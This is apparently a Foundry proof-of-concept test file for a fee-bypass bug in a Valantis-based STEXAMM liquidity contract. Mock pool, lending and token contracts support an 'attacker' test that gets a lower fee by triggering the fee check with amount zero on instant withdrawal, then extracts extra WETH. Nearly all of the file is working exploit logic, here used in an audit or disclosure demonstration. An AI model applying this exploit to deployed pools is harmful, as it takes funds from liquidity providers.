// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.25;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {ISovereignPool} from "@valantis-core/pools/interfaces/ISovereignPool.sol";
import {SovereignPoolConstructorArgs} from "@valantis-core/pools/structs/SovereignPoolStructs.sol";
import {SwapFeeModuleData} from "@valantis-core/swap-fee-modules/interfaces/ISwapFeeModule.sol";
import {IFlashBorrower} from "@valantis-core/pools/interfaces/IFlashBorrower.sol";
import {ALMLiquidityQuoteInput, ALMLiquidityQuote} from "@valantis-core/ALM/structs/SovereignALMStructs.sol";
import {ISTEXAMM} from "../src/interfaces/ISTEXAMM.sol";
import {IWithdrawalModule} from "../src/interfaces/IWithdrawalModule.sol";
import {ILendingModule} from "../src/interfaces/ILendingModule.sol";
import {IStepwiseFeeModule} from "../src/interfaces/IStepwiseFeeModule.sol";
import {IWETH9} from "../src/interfaces/IWETH9.sol";
import {IstHYPE} from "../src/interfaces/sthype/IstHYPE.sol";
import {LPWithdrawalRequest} from "../src/structs/WithdrawalModuleStructs.sol";
import {SovereignPoolSwapParams} from "@valantis-core/pools/structs/SovereignPoolStructs.sol";
import {STEXAMM} from "../src/STEXAMM.sol";
import {StepwiseFeeModule} from "../src/swap-fee-modules/StepwiseFeeModule.sol";

/**
 * @title MockProtocolFactory
 * @notice Mocks the Valantis protocol factory to deploy a mock SovereignPool for testing.
 * @dev Simplifies pool deployment by creating a MockSovereignPool with specified token0 (LST) and token1 (WETH),
 * setting the ALM as the caller (STEXAMM). Avoids complexity of the real factory (e.g., permissions, registry)
 * while enabling STEXAMM.pool() to return a valid pool address, focusing on pool interactions for the fee bypass bug.
 */
contract MockProtocolFactory {
    function deploySovereignPool(SovereignPoolConstructorArgs memory args) external returns (address) {
        return address(new MockSovereignPool(args.token0, args.token1));
    }
}

/**
 * @title MockSovereignPool
 * @notice Simulates the Valantis SovereignPool to handle reserves, swaps, deposits, and withdrawals.
 * @dev Replicates interactions with STEXAMM without full pool logic. Tracks reserve0 (LST) and reserve1 (WETH)
 * with setters for test manipulation (e.g., imbalancing to 450 ETH WETH). Implements depositLiquidity and
 * withdrawLiquidity to update reserves and transfer tokens, calling STEXAMM's onDepositLiquidityCallback.
 * The swap function uses StepwiseFeeModule's getSwapFeeInBips and STEXAMM's getLiquidityQuote to simulate
 * real fee logic. Minimal claimPoolManagerFees and stubs for unused methods (e.g., gauge) satisfy the
 * ISovereignPool interface, focusing on reserve-based fee calculations and token transfers for the bug.
 */
contract MockSovereignPool is ISovereignPool {
    using SafeERC20 for ERC20;

    address public override alm;
    address public override swapFeeModule;
    uint256 public override poolManagerFeeBips;
    uint256 public reserve0;
    uint256 public reserve1;
    bool public isLockedFlag;
    address[] public tokens;
    address public immutable override token0;
    address public immutable override token1;

    constructor(address _token0, address _token1) {
        token0 = _token0;
        token1 = _token1;
        alm = msg.sender;
        tokens = new address[](2);
        tokens[0] = _token0;
        tokens[1] = _token1;
    }

    function getReserves() external view override returns (uint256, uint256) {
        return (reserve0, reserve1);
    }

    function setReserves(uint256 _reserve0, uint256 _reserve1) external {
        reserve0 = _reserve0;
        reserve1 = _reserve1;
    }

    function setSwapFeeModule(address _swapFeeModule) external override {
        swapFeeModule = _swapFeeModule;
    }

    function setPoolManagerFeeBips(uint256 _feeBips) external override {
        poolManagerFeeBips = _feeBips;
    }

    function setALM(address _alm) external override {
        alm = _alm;
    }

    function isLocked() external view override returns (bool) {
        return isLockedFlag;
    }

    function setLocked(bool _locked) external {
        isLockedFlag = _locked;
    }

    function depositLiquidity(
        uint256 _amount0,
        uint256 _amount1,
        address _sender,
        bytes calldata _verificationContext,
        bytes calldata _depositData
    ) external override returns (uint256 amount0Deposited, uint256 amount1Deposited) {
        if (_amount0 > 0) {
            reserve0 += _amount0;
        }
        if (_amount1 > 0) {
            reserve1 += _amount1;
        }
        ISTEXAMM(alm).onDepositLiquidityCallback(_amount0, _amount1, _depositData);
        return (_amount0, _amount1);
    }

    function withdrawLiquidity(
        uint256 _amount0,
        uint256 _amount1,
        address _sender,
        address _recipient,
        bytes calldata _verificationContext
    ) external override {
        require(msg.sender == alm, "Only ALM can withdraw");
        
        if (_amount0 > 0) {
            require(_amount0 <= reserve0, "Insufficient reserve0");
            require(_amount0 <= ERC20(token0).balanceOf(address(this)), "Insufficient token0 balance");
            reserve0 -= _amount0;
            ERC20(token0).safeTransfer(_recipient, _amount0);
        }
        
        if (_amount1 > 0) {
            require(_amount1 <= reserve1, "Insufficient reserve1");
            require(_amount1 <= ERC20(token1).balanceOf(address(this)), "Insufficient token1 balance");
            reserve1 -= _amount1;
            ERC20(token1).safeTransfer(_recipient, _amount1);
        }
    }

    function swap(
        SovereignPoolSwapParams calldata _swapParams
    ) external override returns (uint256 amountIn, uint256 amountOut) {
        SwapFeeModuleData memory swapFeeData = IStepwiseFeeModule(swapFeeModule).getSwapFeeInBips(
            _swapParams.isZeroToOne ? token0 : token1,
            _swapParams.isZeroToOne ? token1 : token0,
            _swapParams.amountIn,
            _swapParams.recipient,
            new bytes(0)
        );

        uint256 amountInMinusFee = Math.mulDiv(_swapParams.amountIn, 10000, 10000 + swapFeeData.feeInBips);

        ALMLiquidityQuoteInput memory quoteInput = ALMLiquidityQuoteInput({
            isZeroToOne: _swapParams.isZeroToOne,
            amountInMinusFee: amountInMinusFee,
            feeInBips: swapFeeData.feeInBips,
            sender: msg.sender,
            recipient: _swapParams.recipient,
            tokenOutSwap: _swapParams.isZeroToOne ? token1 : token0
        });

        ALMLiquidityQuote memory quote = ISTEXAMM(alm).getLiquidityQuote(quoteInput, new bytes(0), new bytes(0));

        if (_swapParams.isZeroToOne) {
            reserve0 += _swapParams.amountIn;
            reserve1 -= quote.amountOut;
            if (quote.amountOut > 0) ERC20(token1).safeTransfer(_swapParams.recipient, quote.amountOut);
        } else {
            reserve1 += _swapParams.amountIn;
            reserve0 -= quote.amountOut;
            if (quote.amountOut > 0) ERC20(token0).safeTransfer(_swapParams.recipient, quote.amountOut);
        }
        return (_swapParams.amountIn, quote.amountOut);
    }

    function claimPoolManagerFees(
        uint256 _feeProtocol0Bips,
        uint256 _feeProtocol1Bips
    ) external override returns (uint256, uint256) {
        uint256 amount0 = _feeProtocol0Bips > 0 && reserve0 > 0
            ? Math.mulDiv(reserve0, _feeProtocol0Bips, 10000)
            : 0;
        uint256 amount1 = _feeProtocol1Bips > 0 && reserve1 > 0
            ? Math.mulDiv(reserve1, _feeProtocol1Bips, 10000)
            : 0;
        if (amount0 > 0) ERC20(token0).safeTransfer(msg.sender, amount0);
        if (amount1 > 0) ERC20(token1).safeTransfer(msg.sender, amount1);
        return (amount0, amount1);
    }

    function claimProtocolFees() external override returns (uint256, uint256) {
        return (0, 0);
    }

    function defaultSwapFeeBips() external view override returns (uint256) {
        return 0;
    }

    function flashLoan(
        bool _isTokenZero,
        IFlashBorrower _receiver,
        uint256 _amount,
        bytes calldata _data
    ) external override {
        address token = _isTokenZero ? token0 : token1;
        ERC20(token).safeTransfer(address(_receiver), _amount);
        _receiver.onFlashLoan(address(this), token, _amount, _data);
    }

    function gauge() external view override returns (address) {
        return address(0);
    }

    function getPoolManagerFees() external view override returns (uint256, uint256) {
        return (0, 0);
    }

    function getTokens() external view override returns (address[] memory) {
        return tokens;
    }

    function isRebaseTokenPool() external view override returns (bool) {
        return false;
    }

    function poolManager() external view override returns (address) {
        return address(0);
    }

    function protocolFactory() external view override returns (address) {
        return address(0);
    }

    function setGauge(address) external override {}

    function setPoolManager(address) external override {}

    function setSovereignOracle(address) external override {}

    function sovereignOracleModule() external view override returns (address) {
        return address(0);
    }

    function sovereignVault() external view override returns (address) {
        return address(0);
    }

    function swapFeeModuleUpdateTimestamp() external view override returns (uint256) {
        return 0;
    }

    function verifierModule() external view override returns (address) {
        return address(0);
    }
}

/**
 * @title MockWithdrawalModule
 * @notice Mocks the stHYPEWithdrawalModule to handle token1 (WETH) conversions and withdrawals.
 * @dev Used by STEXAMM's getLiquidityQuote and withdraw functions. Implements convertToToken1/convertToToken0
 * with a 1:1 rate to bypass rebase complexity, as the bug is in fee calculation, not conversion. Tracks
 * mockAmountToken1LendingPool (set to 0 in PoC) to simulate no lending, focusing on pool reserves.
 * withdrawToken1FromLendingPool transfers available WETH, updating mock values to mimic real behavior.
 * Stubs unused methods (e.g., unstakeToken0Reserves, claim) to satisfy IWithdrawalModule, isolating the
 * fee bypass bug in STEXAMM.
 */
contract MockWithdrawalModule is IWithdrawalModule {
    using SafeERC20 for ERC20;

    address public override stex;
    address public override pool;
    ILendingModule private _lendingModule;
    uint256 public mockAmountToken1LendingPool;
    uint256 public mockAmountToken0PendingUnstaking;
    uint256 public mockAmountToken1PendingLPWithdrawal;
    uint256 public conversionRate;

    constructor() {
        conversionRate = 1e18; // Default 1:1
    }

    function setSTEX(address _stex) external {
        stex = _stex;
        pool = ISTEXAMM(_stex).pool();
    }

    function convertToToken1(uint256 amount) external view override returns (uint256) {
        return Math.mulDiv(amount, 1e18, conversionRate);
    }

    function convertToToken0(uint256 amount) external view override returns (uint256) {
        return Math.mulDiv(amount, conversionRate, 1e18);
    }

    function amountToken1LendingPool() external view override returns (uint256) {
        return mockAmountToken1LendingPool;
    }

    function amountToken0PendingUnstaking() external view override returns (uint256) {
        return mockAmountToken0PendingUnstaking;
    }

    function amountToken1PendingLPWithdrawal() external view override returns (uint256) {
        return mockAmountToken1PendingLPWithdrawal;
    }

    function setMockValues(uint256 lending, uint256 unstaking, uint256 pending) external {
        mockAmountToken1LendingPool = lending;
        mockAmountToken0PendingUnstaking = unstaking;
        mockAmountToken1PendingLPWithdrawal = pending;
    }

    function lendingModule() external view override returns (ILendingModule) {
        return _lendingModule;
    }

    function setLendingModule(address lending) external {
        _lendingModule = ILendingModule(lending);
    }

    function update() external override {}

    function unstakeToken0Reserves(uint256) external override {}

    function burnToken0AfterWithdraw(uint256, address) external override {}

    function supplyToken1ToLendingPool(uint256) external override {}

    function withdrawToken1FromLendingPool(uint256 amount, address recipient) external override {
        uint256 available = ERC20(ISTEXAMM(stex).token1()).balanceOf(address(this));
        if (amount > available) amount = available;
        if (amount > 0) {
            if (mockAmountToken1LendingPool >= amount) {
                mockAmountToken1LendingPool -= amount;
            } else {
                mockAmountToken1LendingPool = 0;
            }
            ERC20(ISTEXAMM(stex).token1()).safeTransfer(recipient, amount);
        }
    }

    function isLocked() external view override returns (bool) {
        return false;
    }

    function overseer() external view override returns (address) {
        return address(0);
    }

    function token0SharesToBalance(uint256 shares) external view override returns (uint256) {
        return shares;
    }

    function token0BalanceToShares(uint256 balance) external view override returns (uint256) {
        return balance;
    }

    function token0SharesOf(address) external view override returns (uint256) {
        return 0;
    }

    function getLPWithdrawals(uint256) external view override returns (LPWithdrawalRequest memory) {
        return LPWithdrawalRequest(address(0), 0, 0);
    }

    function amountToken0PendingUnstakingBeforeUpdate() external view override returns (uint256) {
        return 0;
    }

    function amountToken1PendingLPWithdrawalBeforeUpdate() external view override returns (uint256) {
        return 0;
    }

    function amountToken1ClaimableLPWithdrawal() external view override returns (uint256) {
        return 0;
    }

    function cumulativeAmountToken1LPWithdrawal() external view override returns (uint256) {
        return 0;
    }

    function cumulativeAmountToken1ClaimableLPWithdrawal() external view override returns (uint256) {
        return 0;
    }

    function claim(uint256) external override {}
}

/**
 * @title MockLendingModule
 * @notice Mocks a lending module (e.g., Aave/ERC4626) to simulate token1 (WETH) deposits and withdrawals.
 * @dev Used by MockWithdrawalModule to supply WETH during withdrawals. Tracks a mock balance (set to 0 initially,
 *      later to requiredWeth for exploit) with setters for test control. deposit/withdraw updates balance and
 *      transfers WETH, mimicking lending pool behavior. assetBalance returns the mock balance for
 *      withdrawalModule.amountToken1LendingPool(). Simplifies lending logic (e.g., no yield or caps) to focus
 *      on pool withdrawal mechanics for the fee bug.
 */
contract MockLendingModule is ILendingModule {
    using SafeERC20 for ERC20;

    uint256 private _balance;
    address public token1Address;

    function setToken1(address _token1) external {
        token1Address = _token1;
    }

    function setBalance(uint256 newBalance) external {
        _balance = newBalance;
    }

    function assetBalance() external view override returns (uint256) {
        return _balance;
    }

    function deposit(uint256 amount) external override {
        _balance += amount;
        ERC20(token1Address).safeTransferFrom(msg.sender, address(this), amount);
    }

    function withdraw(uint256 amount, address recipient) external override {
        uint256 available = ERC20(token1Address).balanceOf(address(this));
        if (amount > available) amount = available;
        if (_balance >= amount) {
            _balance -= amount;
        } else {
            _balance = 0;
        }
        ERC20(token1Address).safeTransfer(recipient, amount);
    }
}

/**
 * @title MockWETH
 * @notice Simulates WETH (token1) for ERC20 transfers and native ETH wrapping/unwrapping.
 * @dev Used in pool and withdrawal operations for STEXAMM. Implements standard ERC20 with deposit (mints WETH
 *      for ETH) and withdraw (burns WETH, sends ETH). Used for pool reserves and user balances (e.g., Alice/attacker
 *      approvals). Provides a realistic WETH token for transfers using deal and safeTransfer, avoiding the need
 *      for the real WETH contract while ensuring compatibility with PoC logic.
 */
contract MockWETH is ERC20, IWETH9 {
    constructor() ERC20("Wrapped ETH", "WETH") {}

    function deposit() external payable override {
        _mint(msg.sender, msg.value);
    }

    function withdraw(uint256 amount) external override {
        _burn(msg.sender, amount);
        payable(msg.sender).transfer(amount);
    }
}

/**
 * @title MockLST
 * @notice Mocks the LST (token0, e.g., stHYPE) as a rebase token for STEXAMM deposits and withdrawals.
 * @dev Implements ERC20 and IstHYPE interfaces with 1:1 sharesToBalance/balanceToShares to simplify rebase
 *      mechanics, as the bug is in fee calculation, not conversion rates. Provides mint for test setup (e.g.,
 *      deal to Alice/attacker). Overrides balanceOf to satisfy both interfaces. Simplifies rebase complexity
 *      while ensuring accurate token0 interactions for deposit/withdraw in the PoC.
 */
contract MockLST is ERC20, IstHYPE {
    constructor() ERC20("Mock LST", "MLST") {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function balanceOf(address who) public view override(ERC20, IstHYPE) returns (uint256) {
        return super.balanceOf(who);
    }

    function sharesOf(address who) external view override returns (uint256) {
        return super.balanceOf(who);
    }

    function sharesToBalance(uint256 shares) external view override returns (uint256) {
        return shares;
    }

    function balanceToShares(uint256 balance_) external view override returns (uint256) {
        return balance_;
    }
}

contract ModeratePoC is Test {
    STEXAMM public stexAmm;
    StepwiseFeeModule public feeModule;
    MockWithdrawalModule public withdrawalModule;
    MockProtocolFactory public protocolFactory;
    MockSovereignPool public sovereignPool;
    MockLendingModule public lendingModule;
    MockWETH public weth;
    MockLST public lst;
    address public alice = makeAddr("alice");
    address public attacker = makeAddr("attacker");
    uint256 constant MIN_THRESHOLD = 50 ether;
    uint256 constant MAX_THRESHOLD = 500 ether;

    function setUp() public {
        weth = new MockWETH();
        lst = new MockLST();
        protocolFactory = new MockProtocolFactory();
        withdrawalModule = new MockWithdrawalModule();
        lendingModule = new MockLendingModule();
        lendingModule.setToken1(address(weth));
        withdrawalModule.setLendingModule(address(lendingModule));
        feeModule = new StepwiseFeeModule(address(this));
        stexAmm = new STEXAMM(
            "STEX LP",
            "STEXLP",
            address(lst),
            address(weth),
            address(feeModule),
            address(protocolFactory),
            address(this),
            address(this),
            address(this),
            address(withdrawalModule),
            0
        );
        sovereignPool = MockSovereignPool(stexAmm.pool());
        vm.prank(address(this));
        feeModule.setPool(address(sovereignPool));
        withdrawalModule.setSTEX(address(stexAmm));
        sovereignPool.setALM(address(stexAmm));
        sovereignPool.setSwapFeeModule(address(feeModule));
        uint32[] memory feeSteps = new uint32[](5);
        feeSteps[0] = 5;    // 0.05%
        feeSteps[1] = 50;   // 0.5%
        feeSteps[2] = 200;  // 2%
        feeSteps[3] = 1000; // 10%
        feeSteps[4] = 3000; // 30%
        vm.prank(address(this));
        feeModule.setFeeParamsToken0(MIN_THRESHOLD, MAX_THRESHOLD, feeSteps);
        deal(address(lst), alice, 10000 ether);
        deal(address(weth), alice, 10000 ether);
        deal(address(lst), attacker, 1000 ether);
        deal(address(weth), attacker, 1000 ether);
        vm.startPrank(alice);
        lst.approve(address(stexAmm), type(uint256).max);
        weth.approve(address(stexAmm), type(uint256).max);
        weth.approve(address(sovereignPool), type(uint256).max);
        vm.stopPrank();
        vm.startPrank(attacker);
        lst.approve(address(stexAmm), type(uint256).max);
        weth.approve(address(stexAmm), type(uint256).max);
        weth.approve(address(sovereignPool), type(uint256).max);
        vm.stopPrank();
    }

    function test_InstantWithdrawalFeeBug() public {
        console.log("=== Demonstrating Instant Withdrawal Fee Bypass Bug ===");
        console.log("");
        
        vm.prank(alice);
        stexAmm.deposit(1000 ether, 0, block.timestamp + 1, alice);
        
        deal(address(lst), address(sovereignPool), 1000 ether);
        deal(address(weth), address(sovereignPool), 450 ether);
        sovereignPool.setReserves(1000 ether, 450 ether);
        deal(address(weth), address(lendingModule), 0);
        lendingModule.setBalance(0);
        withdrawalModule.setMockValues(0, 0, 0);
        
        console.log("Initial setup: WETH reserves within 50-500 ETH range");
        console.log("");
        
        vm.prank(attacker);
        stexAmm.deposit(500 ether, 0, block.timestamp + 1, attacker);
        
        (uint256 res0, uint256 res1) = sovereignPool.getReserves();
        uint256 totalWeth = res1 + withdrawalModule.amountToken1LendingPool();
        
        console.log("Pool LST reserves: %s ETH", res0 / 1e18);
        console.log("Pool WETH reserves: %s ETH", res1 / 1e18);
        console.log("Lending WETH: %s ETH", withdrawalModule.amountToken1LendingPool() / 1e18);
        console.log("Total WETH liquidity: %s ETH", totalWeth / 1e18);
        console.log("Fee threshold: min=%s ETH, max=%s ETH", MIN_THRESHOLD / 1e18, MAX_THRESHOLD / 1e18);
        console.log("Liquidity within fee range, enabling variable fees");
        console.log("");
        
        uint256 attackerShares = stexAmm.balanceOf(attacker);
        uint256 totalSupply = stexAmm.totalSupply();
        
        console.log("Attacker deposited 500 WETH, received %s LP shares", attackerShares / 1e18);
        console.log("Total LP supply: %s", totalSupply / 1e18);
        console.log("");
        
        uint256 reserve0PendingWithdrawal = withdrawalModule.convertToToken0(
            withdrawalModule.amountToken1PendingLPWithdrawal()
        );
        uint256 totalLST = res0 + withdrawalModule.amountToken0PendingUnstaking() - reserve0PendingWithdrawal;
        uint256 attackerLSTAmount = Math.mulDiv(attackerShares, totalLST, totalSupply);
        
        console.log("Attacker's pro-rata LST amount: %s ETH", attackerLSTAmount / 1e18);
        console.log("");
        
        sovereignPool.setReserves(1000 ether, 450 ether);
        
        console.log("=== Fee Calculation Comparison ===");
        
        uint256 postSwapReserve1 = 450 ether - attackerLSTAmount;
        console.log("Simulated post-swap WETH reserve: %s ETH", postSwapReserve1 / 1e18);
        
        vm.startPrank(address(this));
        sovereignPool.setReserves(1000 ether, postSwapReserve1);
        SwapFeeModuleData memory normalFee = IStepwiseFeeModule(sovereignPool.swapFeeModule())
            .getSwapFeeInBips(
                address(lst),
                address(weth),
                attackerLSTAmount,
                address(0),
                new bytes(0)
            );
        
        sovereignPool.setReserves(1000 ether, 450 ether);
        SwapFeeModuleData memory buggyFee = IStepwiseFeeModule(sovereignPool.swapFeeModule())
            .getSwapFeeInBips(
                address(lst),
                address(weth),
                0,
                address(0),
                new bytes(0)
            );
        vm.stopPrank();
        
        console.log("Normal fee (post-swap reserve1=%s ETH): %s bips (%s%%)",
                   postSwapReserve1 / 1e18, normalFee.feeInBips, normalFee.feeInBips * 100 / 10000);
        console.log("Buggy fee (pre-swap reserve1=450 ETH): %s bips (%s%%)",
                   450 ether / 1e18, buggyFee.feeInBips, buggyFee.feeInBips * 100 / 10000);
        
        uint256 feeDifference = normalFee.feeInBips - buggyFee.feeInBips;
        console.log("Fee difference: %s bips (%s%% bypass)",
                   feeDifference, feeDifference * 100 / 10000);
        console.log("");
        
        uint256 normalAmountOut = Math.mulDiv(attackerLSTAmount, 10000, 10000 + normalFee.feeInBips);
        uint256 exploitAmountOut = Math.mulDiv(attackerLSTAmount, 10000, 10000 + buggyFee.feeInBips);
        
        console.log("Normal output: %s WETH", normalAmountOut / 1e18);
        console.log("Exploit output: %s WETH", exploitAmountOut / 1e18);
        console.log("Extra gain: %s WETH (%s%% more)",
                   (exploitAmountOut - normalAmountOut) / 1e18,
                   (exploitAmountOut - normalAmountOut) * 100 / normalAmountOut);
        console.log("");
        
        uint256 requiredWeth = exploitAmountOut + 100 ether;
        deal(address(weth), address(sovereignPool), requiredWeth);
        deal(address(weth), address(lendingModule), requiredWeth);
        deal(address(weth), address(withdrawalModule), requiredWeth);
        sovereignPool.setReserves(1000 ether, requiredWeth);
        lendingModule.setBalance(requiredWeth);
        withdrawalModule.setMockValues(requiredWeth, 0, 0);
        
        console.log("=== Executing Instant Withdrawal Exploit ===");
        
        uint256 initialWethBalance = weth.balanceOf(attacker);
        console.log("Attacker initial WETH balance: %s ETH", initialWethBalance / 1e18);
        
        vm.prank(attacker);
        (, uint256 actualReceived) = stexAmm.withdraw(
            attackerShares,
            0,
            0,
            block.timestamp + 1,
            attacker,
            false,
            true
        );
        
        uint256 finalWethBalance = weth.balanceOf(attacker);
        uint256 totalReceived = finalWethBalance - initialWethBalance;
        
        console.log("Actual WETH received: %s ETH", actualReceived / 1e18);
        console.log("Total WETH balance increase: %s ETH", totalReceived / 1e18);
        console.log("");
        
        console.log("=== FINAL CONFIRMATION ===");
        console.log("Bug bypasses %s%% of fees via instant withdrawal",
                   feeDifference * 100 / 10000);
        console.log("Fee saved: %s bips", feeDifference);
        console.log("Attack successful: Fee uses 0 amount instead of actual amount");
        console.log("");
        
        assertTrue(feeDifference > 1000, "Failed to bypass significant fee (>10%)");
        assertTrue(buggyFee.feeInBips < normalFee.feeInBips, "Bug is not resulting in lower fee");
        assertTrue(actualReceived > normalAmountOut, "Did not receive more than normal withdrawal");
        
        console.log("DEMONSTRATION FINISHED");
    }
}
